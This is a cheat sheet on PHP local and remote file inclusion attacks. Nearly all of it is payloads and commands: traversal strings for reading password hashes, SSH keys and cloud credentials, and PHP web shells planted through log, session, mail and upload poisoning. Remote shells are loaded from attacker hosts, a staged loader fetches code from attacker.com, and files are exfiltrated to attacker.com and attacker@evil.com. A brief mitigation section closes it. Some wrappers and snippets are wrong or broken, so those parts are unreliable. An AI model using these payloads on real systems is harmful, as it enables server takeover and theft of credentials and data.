### Local/Remote File Inclusion (LFI/RFI)

**File Inclusion vulnerabilities** allow attackers to include files on a server through the web browser. This can lead to sensitive information disclosure, remote code execution, or cross-site scripting. Local File Inclusion (LFI) allows inclusion of local files, while Remote File Inclusion (RFI) allows inclusion of remote files from external servers.

* **Vulnerable Functions:** Functions like `include()`, `require()` in PHP that process user-supplied file paths without validation.
* **Common Targets:** Web applications that dynamically include pages, templates, or configuration files based on URL parameters.
* **Impact:** File disclosure, source code leakage, remote code execution, and server compromise.
* **Root Cause:** Lack of proper input validation and sanitization of user-controlled file paths.

-----

### Basic LFI/RFI Payloads and Impact

The most common file inclusion attacks involve manipulating file path parameters to traverse directories or include remote files.

#### Reading Local Files (LFI)

```
vulnerable.php?page=../../../etc/passwd
```

* **Why it's used:** To confirm vulnerability and extract sensitive system files like `/etc/passwd` or configuration files.
* **How it works:** The attacker uses directory traversal sequences (`../`) to navigate out of the webroot and access restricted system files.

#### Remote File Inclusion (RFI)

```
vulnerable.php?page=http://attacker.com/shell.txt
```

* **Why it's used:** To execute arbitrary code on the vulnerable server by including malicious files from external servers.
* **How it works:** When `allow_url_include` is enabled in PHP, the server fetches and executes remote files as if they were local.

#### Directory Traversal Techniques

```
?file=....//....//etc/passwd
?include=/etc/passwd
```

* **Why it's used:** To bypass simple filtering mechanisms and access files outside the intended directory.
* **How it works:** Different encoding and traversal patterns exploit how the application processes file paths.

-----

### Reading Sensitive Files - Complete List

#### Linux System Files

```bash
# User and authentication
/etc/passwd           # User accounts
/etc/shadow           # Password hashes (requires root)
/etc/group            # Group information
/etc/sudoers          # Sudo permissions
/etc/security/opasswd # Old passwords

# Network configuration
/etc/hosts              # Hostname mappings
/etc/resolv.conf        # DNS configuration
/etc/network/interfaces # Network interfaces
/etc/ssh/sshd_config    # SSH server config

# Service configurations
/etc/apache2/apache2.conf         # Apache
/etc/nginx/nginx.conf             # Nginx
/etc/mysql/my.cnf                 # MySQL
/etc/postgresql/*/postgresql.conf # PostgreSQL
```

#### Application Files

```bash
# Web application configs
/var/www/html/config.php
/var/www/html/.env
/var/www/html/.htaccess
/var/www/html/wp-config.php # WordPress

# Framework files
/var/www/html/app/config/database.php # Laravel
/var/www/html/config/database.yml     # Rails
/var/www/html/application.properties  # Spring

# Source code
/var/www/html/index.php
/var/www/html/admin.php
/var/www/html/includes/functions.php
```

#### User Data and Credentials

```bash
# SSH keys
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/*/.ssh/id_rsa

# Shell history
/root/.bash_history
/home/*/.bash_history
/root/.zsh_history

# AWS/Docker credentials
/root/.aws/credentials
/root/.docker/config.json
/home/*/.aws/credentials
```

#### Process Information (Current)

```bash
/proc/self/environ   # Environment variables
/proc/self/cmdline   # Command and arguments
/proc/self/stat      # Process status
/proc/self/status    # Detailed status
/proc/self/fd/[0-9]* # Open file descriptors
/proc/self/cwd       # Current working directory
/proc/self/exe       # Path to executable
```

#### System-wide Information

```bash
/proc/version      # Kernel version
/proc/cpuinfo      # CPU information
/proc/meminfo      # Memory usage
/proc/mounts       # Mounted filesystems
/proc/net/tcp      # TCP connections
/proc/net/udp      # UDP connections
/proc/net/arp      # ARP table
/proc/net/route    # Routing table
/proc/net/fib_trie # FIB trie (advanced routing)
```

#### Other Processes (if readable)

```bash
# Find interesting PIDs
/proc/[1-9]*/cmdline # Process commands
/proc/[1-9]*/environ # Process environment
/proc/[1-9]*/cwd     # Process working directory

# Example: Find MySQL process
grep -l "mysql" /proc/[1-9]*/cmdline 2>/dev/null
```

#### Identify Log Locations

```bash
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/mail.log
/var/log/vsftpd.log
```

-----

### File Inclusion in Different Contexts

File inclusion vulnerabilities can appear in various contexts beyond simple page parameters, including file uploads, log files, and session data.

#### Log File Poisoning

```http
vulnerable.php?page=/var/log/apache2/access.log&cmd=id

GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

* **Why it's used:** When direct file inclusion is filtered but log files can be accessed and contain executable code.
* **How it works:** The attacker injects PHP code into HTTP headers (User-Agent, Referer) that gets logged, then includes the log file to execute the code.

#### PHP Wrapper Exploitation

```
vulnerable.php?page=php://filter/convert.base64-encode/resource=index.php
```

* **Why it's used:** To read source code or binary files that would otherwise cause execution or display issues.
* **How it works:** PHP wrappers like `php://filter` allow reading files with various encodings, bypassing some execution contexts.

#### Session File Inclusion

```
vulnerable.php?page=/tmp/sess_[SESSION_ID]
```

* **Why it's used:** When session files store user-controlled data that can include executable code.
* **How it works:** The attacker sets a session variable with malicious code, then includes the session file to execute it.

-----

### Blind File Inclusion and Data Exfiltration

Blind file inclusion occurs when file content is included but not displayed directly in the response, requiring creative exfiltration techniques.

#### Error-Based Exfiltration

```http
vulnerable.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

* **Why it's used:** When file content isn't displayed but errors might reveal encoded data.
* **How it works:** Base64-encoded content might appear in error messages or page source when inclusion causes parsing issues.

#### Time-Based Detection

```http
vulnerable.php?page=http://attacker.com/slow.txt
```

* **Why it's used:** To confirm RFI when no direct output is available.
* **How it works:** A remote file with delayed response confirms successful inclusion based on increased response time.

#### Out-of-Band Exfiltration

```http
vulnerable.php?page=http://attacker.com/collect.php?data=CONTENT
```

* **Why it's used:** When all direct output methods are blocked.
* **How it works:** The included remote file sends collected data back to the attacker's server.

-----

### Advanced Protocol and Wrapper Techniques

Attackers leverage various PHP wrappers and protocols to extend file inclusion capabilities beyond simple file reading.

#### PHP Filter Wrappers

```
vulnerable.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

* **Why it's used:** To safely read files containing special characters that would break HTML/XML parsing.
* **How it works:** The filter encodes file content before inclusion, preventing parsing errors while maintaining data integrity.

#### Data URI Scheme

```
vulnerable.php?page=data://text/plain,<?php system('id'); ?>
```

* **Why it's used:** For direct code execution when remote file inclusion is blocked.
* **How it works:** The data URI scheme allows embedding executable code directly in the parameter.

#### ZIP/PHAR Wrappers

```
vulnerable.php?page=zip://archive.zip%23shell.php
vulnerable.php?page=phar://archive.phar/shell.php
```

* **Why it's used:** To bypass file upload restrictions and execute code from archives.
* **How it works:** These wrappers allow including files from within archive files, useful when direct file upload is restricted.

-----

### Detection and Exploitation Tools

Security testers use various tools to identify and exploit file inclusion vulnerabilities efficiently.

#### Automated Scanners

* **Why it's used:** To quickly identify vulnerable parameters and test multiple payloads.
* **How it works:** Tools like Burp Suite, OWASP ZAP, and Nuclei automate the process of sending traversal payloads and analyzing responses.

#### Custom Fuzzing Scripts

```python
import requests

payloads = ['../../../etc/passwd', '....//....//etc/passwd']
for payload in payloads:
    r = requests.get(f'http://target.com/?page={payload}')
    if 'root:' in r.text:
        print(f'Vulnerable with {payload}')
```

* **Why it's used:** For targeted testing of specific applications or parameters.
* **How it works:** Custom scripts allow fine-tuned payload delivery and response analysis.

#### Directory Traversal Tools

```
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -k root
```

* **Why it's used:** Specialized tools for comprehensive directory traversal testing.
* **How it works:** These tools generate various traversal payloads and automatically detect successful file access.

-----

### Advanced Bypass Techniques

When basic file inclusion is blocked, attackers employ various bypass techniques to evade filters and restrictions.

#### Encoding Bypasses

```
..%252f..%252fetc%252fpasswd
..%c0%af..%c0%afetc%c0%afpasswd
```

* **Why it's used:** To bypass WAFs and input filters that check for specific strings.
* **How it works:** Double encoding, Unicode encoding, and other transformations evade simple string matching.

#### Null Byte Injection

```
vulnerable.php?page=../../../etc/passwd%00
```

* **Why it's used:** To truncate file extensions appended by the application.
* **How it works:** Null bytes terminate strings in C-based languages, removing added extensions like `.php`.

#### Path Truncation

```
vulnerable.php?page=../../../etc/passwd............
vulnerable.php?page=../../../etc/passwd?.php
```

* **Why it's used:** When null bytes don't work but path length limitations exist.
* **How it works:** Excessive characters or query parameters can cause extension truncation.

-----

### Source Code Disclosure Techniques

Reading application source code is often the first step in understanding and exploiting the application further.

#### PHP Filter Chain Encoding

```
vulnerable.php?page=php://filter/convert.base64-encode/resource=config.php
```

* **Why it's used:** To safely read PHP files that would execute if included directly.
* **How it works:** Base64 encoding prevents PHP execution while preserving file content.

#### Multiple Encoding Layers

```
vulnerable.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=index.php
```

* **Why it's used:** When simple base64 encoding is detected and blocked.
* **How it works:** Additional encoding layers bypass simple detection of common payloads.

#### Character Set Conversion

```
vulnerable.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=config.php
```

* **Why it's used:** To transform file content in ways that evade detection.
* **How it works:** Character set conversion can bypass filters looking for specific patterns.

-----

### Remote Code Execution (RCE) through LFI (RFI)

File inclusion vulnerabilities often lead to remote code execution, providing full server control.

#### Log Poisoning RCE

```bash
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
```

* **Why it's used:** When direct file upload or inclusion isn't possible.
* **How it works:** Poisoning log files with PHP code, then including those logs to execute the code.

#### PHP Input Wrapper

```http
POST /?page=php://input HTTP/1.1

<?php system('id'); ?>


# Curl command to execute the code
curl -s -X POST 'http://example.com/index.php?language=php://input' -d '<?php system($_REQUEST["cmd"]); ?>&cmd=id'
```

#### HTTP/FTP Wrapper for Remote Shell

1. Host a `shell.php` file on a web server you control (e.g., http://your-server/shell.php):

```php
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

2. Then include and execute it using HTTP/FTP wrapper:

```http
GET /vulnerable.php?page=http://<attacker-ip>/shell.php&cmd=id HTTP/1.1

GET /vulnerable.php?page=ftp://<attacker-ip>/shell.php&cmd=id HTTP/1.1

# Using curl to test
curl 'http://victim.com/vulnerable.php?page=http://<attacker-ip>/shell.php&cmd=id'
```

* **Why it's used:** For direct code execution without file upload.
* **How it works:** The HTTP/FTP wrapper reads remote file content as PHP code, allowing code execution.

#### Session File Injection

```http
GET /?param=<?php system('id'); ?> HTTP/1.1
Cookie: PHPSESSID=injected
```

* **Why it's used:** When session storage is predictable and accessible.
* **How it works:** Injecting code into session variables, then including the session file.

#### SMB Share for Remote Shell

* Set up an SMB server to host your shell:

```bash
impacket-smbserver -smb2support share $(pwd)

# Create shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

* Include and execute the shell using SMB:

```http
GET /index.php?language=\\10.10.15.90\share\shell.php&cmd=id
```

#### HTTP Server for Remote Shell

* Host the shell using Python's built-in HTTP server:

```bash
# Create shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php

# Start HTTP server
python3 -m http.server 8000
```

* Include and execute the shell:

```http
GET /index.php?language=http://10.10.15.90:8000/shell.php&cmd=id
```

#### FTP Server for Remote Shell

* Host the shell using Python's pyftpdlib:

```bash
# Install pyftpdlib
pip3 install pyftpdlib

# Create shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php

# Start FTP server
python3 -m pyftpdlib -p 21 -w
```

* Include and execute the shell:

```http
GET /index.php?language=ftp://10.10.15.90/shell.php&cmd=id
```

* **Important Notes:**
  * SMB and FTP servers may be blocked by firewalls
  * HTTP is more likely to work through firewalls
  * Use port 80/443 for HTTP/HTTPS when possible
  * URL-encode special characters if needed

-----

### Advanced Bypass Techniques

When basic file inclusion payloads are blocked, attackers use sophisticated bypass techniques to evade detection and filtering.

#### Unicode and Encoding Bypasses

```bash
# Unicode encoding
vulnerable.php?page=..%u002f..%u002fetc%u002fpasswd

# Double encoding
vulnerable.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Mixed encoding
vulnerable.php?page=..%c0%af..%c0%afetc%c0%afpasswd

# UTF-8 overlong encoding
vulnerable.php?page=..%e0%80%af..%e0%80%afetc%e0%80%afpasswd
```

* **Why it's used:** To bypass WAFs and input validation that only check for standard ASCII characters.
* **How it works:** Different encoding schemes represent the same characters in ways that evade simple string matching.

#### Path Normalization Bypasses

```bash
# Windows path separators on Linux
vulnerable.php?page=..\..\..\etc\passwd

# UNC paths
vulnerable.php?page=\\server\share\file.txt

# Relative path variations
vulnerable.php?page=./../../../etc/passwd
vulnerable.php?page=../../../etc/passwd/.
```

* **Why it's used:** When the application normalizes paths but doesn't handle all variations.
* **How it works:** Different path representations can bypass normalization logic.

#### Null Byte and Truncation Attacks

```bash
# Null byte injection
vulnerable.php?page=../../../etc/passwd%00.php

# Path truncation with long strings
vulnerable.php?page=../../../etc/passwd............................................

# Query parameter truncation
vulnerable.php?page=../../../etc/passwd?.jpg
```

* **Why it's used:** When the application appends file extensions or performs string operations.
* **How it works:** Null bytes terminate strings, and long paths can cause buffer truncation.

#### Case Variation Bypasses

```bash
# Case insensitive filesystems
vulnerable.php?page=../../../ETC/PASSWD
vulnerable.php?page=../../../etc/Passwd

# Mixed case traversal
vulnerable.php?page=..%2F..%2F..%2Fetc%2Fpasswd
```

* **Why it's used:** On case-insensitive filesystems or when filters are case-sensitive.
* **How it works:** Varying case can bypass filters that look for specific patterns.

#### Comment Injection

```bash
# PHP comment injection
vulnerable.php?page=../../../etc/passwd%00#anything

# SQL-style comments (if applicable)
vulnerable.php?page=../../../etc/passwd-- 
```

* **Why it's used:** When the application processes input with comment handling.
* **How it works:** Comments can truncate or modify the processed path.

-----

### Windows-Specific File Inclusion

File inclusion on Windows systems has unique characteristics and file locations compared to Linux.

#### Windows System Files

```bash
# Boot configuration
C:\boot.ini
C:\Windows\win.ini
C:\Windows\system.ini

# System information
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\lmhosts
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM

# User data
C:\Users\Administrator\Desktop\desktop.ini
C:\Users\Administrator\Documents\*
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\*

# IIS configuration
C:\inetpub\wwwroot\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
```

#### Windows Registry Access

```bash
# Registry wrappers (if available)
vulnerable.php?page=registry://HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run

# Registry files
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SOFTWARE
```

#### Windows Log Files

```bash
# Event logs
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx

# IIS logs
C:\inetpub\logs\LogFiles\W3SVC1\*
C:\Windows\System32\LogFiles\HTTPERR\*

# Application logs
C:\Program Files\Microsoft SQL Server\MSSQL*\MSSQL\Log\ERRORLOG
```

#### Windows Process Information

```bash
# Windows equivalent of /proc
# Note: Windows doesn't have /proc, but some information is available through:
# - Task Manager
# - Process Explorer
# - WMI queries (if accessible)
```

#### Windows-Specific Traversal

```bash
# Windows path traversal
vulnerable.asp?page=..\..\..\Windows\System32\drivers\etc\hosts

# UNC path traversal
vulnerable.asp?page=\\127.0.0.1\C$\Windows\System32\drivers\etc\hosts

# 8.3 filename shorthand
vulnerable.asp?page=..\..\..\PROGRA~1\COMMON~1\MICROS~1\WEBCAM\WEBCAM.EXE
```

* **Why it's used:** Windows file systems have different path conventions and accessible files.
* **How it works:** Windows uses backslashes, UNC paths, and has different system file locations.

-----

### Advanced PHP Wrapper Exploitation

PHP provides various wrappers that can be exploited for file inclusion attacks beyond basic file reading.

#### Input Wrapper for Code Execution

```bash
# Direct code execution
vulnerable.php?page=php://input

# POST body contains:
<?php system('id'); ?>
```

* **Why it's used:** When RFI is disabled but input wrapper is available.
* **How it works:** The input wrapper reads from POST data, allowing direct code execution.

#### Filter Chain Exploitation

```bash
# Multiple filters
vulnerable.php?page=php://filter/convert.base64-encode|convert.iconv.utf-8.utf-16/resource=index.php

# Compression and encoding
vulnerable.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=config.php
```

* **Why it's used:** To bypass filters that block single encoding methods.
* **How it works:** Chaining multiple filters creates complex transformations.

#### Memory and Temp File Wrappers

```bash
# Memory wrapper
vulnerable.php?page=php://memory

# Temp file wrapper
vulnerable.php?page=php://temp

# Max memory temp
vulnerable.php?page=php://temp/maxmemory:1024
```

* **Why it's used:** For reading from memory or temporary storage.
* **How it works:** These wrappers access PHP's internal memory and temp file handling.

#### Output Wrapper

```bash
# Capture output
vulnerable.php?page=php://output

# With ob_start()
<?php ob_start(); include('php://output'); echo 'data'; ?>
```

* **Why it's used:** For capturing and manipulating output streams.
* **How it works:** The output wrapper allows writing to the output buffer.

#### Standard Stream Wrappers

```bash
# STDIN
vulnerable.php?page=php://stdin

# STDOUT  
vulnerable.php?page=php://stdout

# STDERR
vulnerable.php?page=php://stderr
```

* **Why it's used:** For interacting with PHP's standard I/O streams.
* **How it works:** These provide access to standard input, output, and error streams.

#### Custom Wrapper Creation

```php
# If you can create a custom wrapper
stream_wrapper_register("evil", "EvilWrapper");

class EvilWrapper {
    public function stream_open($path, $mode, $options, &$opened_path) {
        // Custom logic here
        return true;
    }
    public function stream_read($count) {
        return "<?php system('id'); ?>";
    }
}
```

* **Why it's used:** When you can register custom stream wrappers.
* **How it works:** Custom wrappers allow complete control over stream behavior.

-----

### Database File Inclusion

Including database files can reveal sensitive information or allow code execution in some contexts.

#### SQLite Database Files

```bash
# SQLite database files
vulnerable.php?page=/var/www/html/database.db
vulnerable.php?page=../../../var/www/html/users.db

# Common locations
/var/www/html/db.sqlite
/var/www/html/app.db
/var/www/html/storage/database.sqlite
```

#### MySQL Data Files

```bash
# MySQL data directory
vulnerable.php?page=/var/lib/mysql/mysql/user.MYD
vulnerable.php?page=/var/lib/mysql/mysql/user.MYI

# InnoDB files
/var/lib/mysql/ibdata1
/var/lib/mysql/ib_logfile0
```

#### PostgreSQL Data

```bash
# PostgreSQL data directory
vulnerable.php?page=/var/lib/postgresql/9.*/main/base/*/PG_VERSION
vulnerable.php?page=/var/lib/postgresql/data/pg_hba.conf
```

#### MongoDB Data Files

```bash
# MongoDB data files
vulnerable.php?page=/var/lib/mongodb/collection.0
vulnerable.php?page=/data/db/collection.wt
```

* **Why it's used:** Database files often contain sensitive information like credentials.
* **How it works:** Including binary database files can leak data or cause parsing errors that reveal information.

-----

### Log Poisoning Techniques

Log files are often accessible and can be poisoned with executable code for inclusion attacks.

#### Web Server Log Poisoning

```bash
# Apache access log
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
curl "http://target.com/vulnerable.php?page=/var/log/apache2/access.log&cmd=id"

# Nginx access log
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
curl "http://target.com/vulnerable.php?page=/var/log/nginx/access.log&cmd=id"
```

#### SSH Log Poisoning

```bash
# SSH auth log
ssh '<?php system($_GET["cmd"]); ?>'@target.com
curl "http://target.com/vulnerable.php?page=/var/log/auth.log&cmd=id"
```

#### Mail Log Poisoning

```bash
# Send email with PHP code
mail -s "Subject" target@target.com < <(echo "<?php system(\$_GET['cmd']); ?>")
curl "http://target.com/vulnerable.php?page=/var/log/mail.log&cmd=id"
```

#### FTP Log Poisoning

```bash
# FTP login with PHP code
ftp -u "user:<?php system(\$_GET['cmd']); ?>" ftp://target.com
curl "http://target.com/vulnerable.php?page=/var/log/vsftpd.log&cmd=id"
```

* **Why it's used:** When direct file inclusion is blocked but logs are accessible.
* **How it works:** Injecting code into various log files that get included later.

-----

### Session and Cookie Poisoning

Session files and cookies can be manipulated to include executable code.

#### PHP Session Poisoning

```bash
# Set session with PHP code
curl -c cookies.txt -b cookies.txt \
  -d "data=<?php system(\$_GET['cmd']); ?>" \
  http://target.com/set_session.php

# Include session file
curl "http://target.com/vulnerable.php?page=/tmp/sess_$(cat cookies.txt | grep PHPSESSID | cut -d'	' -f7)&cmd=id"
```

#### ASP.NET Session Files

```bash
# ASP.NET session files
vulnerable.aspx?page=C:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\root\*\*\sessionstate\session123
```

#### Custom Session Handlers

```bash
# Database session storage
vulnerable.php?page=mysql://user:pass@host/db/table/session_id

# File-based sessions
vulnerable.php?page=/var/lib/php/sessions/sess_sessionid
```

* **Why it's used:** When session data is stored in files that can be included.
* **How it works:** Poisoning session variables with code, then including the session file.

-----

### File Upload to Inclusion

Combining file upload vulnerabilities with file inclusion for code execution.

#### Upload and Include Chain

```bash
# Upload shell
curl -X POST -F "file=@shell.php" http://target.com/upload.php

# Include uploaded file
curl "http://target.com/vulnerable.php?page=uploads/shell.php&cmd=id"
```

#### Image Upload with PHP Code

```bash
# Create polyglot image with PHP
echo -e "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\xff\xc0\x00\x11\x08\x00\x01\x00\x01\x01\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00<?php system(\$_GET['cmd']); ?>" > shell.jpg

# Upload image
curl -X POST -F "image=@shell.jpg" http://target.com/upload.php

# Include as PHP
curl "http://target.com/vulnerable.php?page=uploads/shell.jpg&cmd=id"
```

#### Archive Upload Exploitation

```bash
# Create ZIP with shell
zip shell.zip shell.php
curl -X POST -F "file=@shell.zip" http://target.com/upload.php

# Include from ZIP
curl "http://target.com/vulnerable.php?page=zip://uploads/shell.zip%23shell.php&cmd=id"
```

* **Why it's used:** When file upload restrictions can be bypassed.
* **How it works:** Uploading files that can be included using various wrappers.

-----

### Blind File Inclusion Exploitation

When file inclusion doesn't show direct output, alternative exploitation techniques are needed.

#### Error-Based Data Exfiltration

```bash
# Force errors to leak data
vulnerable.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

# Look for base64 in error messages
```

#### Time-Based Detection

```bash
# Include remote file with delay
vulnerable.php?page=http://attacker.com/delay.php

# Measure response time to confirm inclusion
```

#### DNS Exfiltration

```bash
# Include file that performs DNS lookup
vulnerable.php?page=http://attacker.com/exfil.php?data=$(cat /etc/passwd | base64)
```

#### Out-of-Band Channels

```bash
# HTTP exfiltration
vulnerable.php?page=http://attacker.com/log.php?data=CONTENT

# Email exfiltration
vulnerable.php?page=data://text/plain,<?php mail('attacker@evil.com','Data',file_get_contents('/etc/passwd')); ?>
```

* **Why it's used:** When direct output is not visible.
* **How it works:** Using various channels to exfiltrate data without direct display.

-----

### Advanced Remote Code Execution Techniques

Beyond basic RFI, there are sophisticated methods to achieve code execution.

#### RFI with Custom Protocols

```bash
# Expect wrapper (if enabled)
vulnerable.php?page=expect://id

# Glob wrapper
vulnerable.php?page=glob:///*/*

# Phar wrapper with custom protocol
vulnerable.php?page=phar://evil.phar/file
```

#### Code Injection via RFI

```bash
# Remote file with code
echo '<?php system($_GET["cmd"]); ?>' > remote_shell.php
python3 -m http.server 8000

# Include and execute
vulnerable.php?page=http://attacker.com:8000/remote_shell.php&cmd=id
```

#### Multi-Stage Payloads

```bash
# Stage 1: Download and execute
vulnerable.php?page=data://text/plain,<?php file_put_contents('/tmp/shell.php',file_get_contents('http://attacker.com/shell.php')); include('/tmp/shell.php'); ?>

# Stage 2: Execute downloaded shell
vulnerable.php?page=/tmp/shell.php&cmd=id
```

#### Memory-Based Execution

```bash
# Execute code in memory
vulnerable.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

* **Why it's used:** For sophisticated code execution without leaving files on disk.
* **How it works:** Using data URIs and encoding to execute code in memory.

-----

### Detection and Prevention Bypass

Techniques to detect file inclusion vulnerabilities and bypass common protections.

#### Automated Detection Scripts

```python
import requests
import base64

def test_lfi(url, param):
    payloads = [
        '../../../etc/passwd',
        '....//....//etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php'
    ]
    
    for payload in payloads:
        r = requests.get(f'{url}?{param}={payload}')
        if 'root:' in r.text or 'base64' in r.text:
            print(f'Vulnerable: {payload}')
            return True
    return False
```

#### WAF Bypass Techniques

```bash
# Keyword replacement
vulnerable.php?page=..%2f..%2f..%2fetc%2fpasswd

# Case variation
vulnerable.php?page=..%2F..%2F..%2Fetc%2Fpasswd

# Encoding chains
vulnerable.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

#### Filter Evasion

```bash
# Remove dots
vulnerable.php?page=etc/passwd

# Use absolute paths
vulnerable.php?page=/etc/passwd

# Combine techniques
vulnerable.php?page=....//....//etc/passwd%00.jpg
```

* **Why it's used:** To bypass security controls and detection systems.
* **How it works:** Various encoding and transformation techniques evade filters.

-----

### Real-World Exploitation Examples

Practical examples of file inclusion vulnerabilities found in real applications.

#### WordPress Plugin Vulnerability

```bash
# Vulnerable plugin parameter
wp-content/plugins/vulnerable/download.php?file=../../../wp-config.php
```

#### Joomla Component LFI

```bash
# Joomla extension vulnerability
index.php?option=com_vulnerable&view=../../../../../../etc/passwd
```

#### Drupal Module RFI

```bash
# Drupal module with RFI
sites/all/modules/vulnerable/vulnerable.php?url=http://attacker.com/shell.txt
```

#### Custom CMS LFI

```bash
# Custom application
page.php?include=../../../app/config/database.php
```

#### E-commerce Platform

```bash
# Shopping cart LFI
product.php?id=1&lang=../../../../../../etc/passwd
```

* **Why it's used:** Real-world examples show how LFI/RFI appears in popular applications.
* **How it works:** Common patterns in web application development lead to these vulnerabilities.

-----

### Mitigation and Prevention

Best practices to prevent file inclusion vulnerabilities.

#### Input Validation

```php
// Whitelist approach
$allowed_pages = ['home', 'about', 'contact'];
if (!in_array($_GET['page'], $allowed_pages)) {
    die('Invalid page');
}
include($_GET['page'] . '.php');
```

#### Path Sanitization

```php
// Remove dangerous characters
$page = str_replace(['../', '..\\', '\\', '/'], '', $_GET['page']);
$page = basename($page); // Get filename only
include($page . '.php');
```

#### Configuration Hardening

```ini
# php.ini settings
allow_url_fopen = Off
allow_url_include = Off
open_basedir = /var/www/html
```

#### Web Server Configuration

```apache
# Apache .htaccess
<Files *.php>
    php_flag engine off
</Files>

# Nginx configuration
location ~ \.php$ {
    include fastcgi_params;
    fastcgi_param PHP_VALUE "open_basedir=/var/www/html";
}
```

#### File Permissions

```bash
# Restrict file permissions
chmod 644 /var/www/html/*.php
chmod 444 /etc/passwd  # If possible
```

* **Why it's used:** To prevent file inclusion attacks through proper security controls.
* **How it works:** Multiple layers of defense make exploitation difficult.

-----

### Tools and Automation

Tools and scripts for detecting and exploiting file inclusion vulnerabilities.

#### Manual Testing Tools

```bash
# dotdotpwn - Directory traversal testing
dotdotpwn -m http -h target.com -f /etc/passwd -k root

# LFISuite - LFI exploitation suite
python lfisuite.py -u "http://target.com/page.php?file=FUZZ" -c "cat /etc/passwd"
```

#### Automated Scanners

```bash
# Nikto web scanner
nikto -h target.com -Tuning 5

# OWASP ZAP
zap.sh -cmd -quickurl http://target.com -quickout report.xml

# Burp Suite Intruder
# Use payload: ../../../etc/passwd
```

#### Custom Exploitation Scripts

```python
import requests
import sys

def exploit_lfi(url, param, file_path):
    payload = f'php://filter/convert.base64-encode/resource={file_path}'
    r = requests.get(f'{url}?{param}={payload}')
    
    # Extract base64 from response
    import re
    b64_match = re.search(r'[A-Za-z0-9+/=]{20,}', r.text)
    if b64_match:
        decoded = base64.b64decode(b64_match.group(0))
        print(decoded.decode('utf-8', errors='ignore'))

if __name__ == '__main__':
    exploit_lfi(sys.argv[1], sys.argv[2], sys.argv[3])
```

#### Fuzzing with ffuf

```bash
# Directory traversal fuzzing
ffuf -u "http://target.com/page.php?file=FUZZ" -w lfi-payloads.txt -mc 200

# Filter-based fuzzing
ffuf -u "http://target.com/page.php?file=php://filter/FILTER/resource=FUZZ" -w files.txt
```

* **Why it's used:** To automate the detection and exploitation process.
* **How it works:** Tools generate payloads and analyze responses for successful inclusion.

-----

**Made with love by VIsh0k**
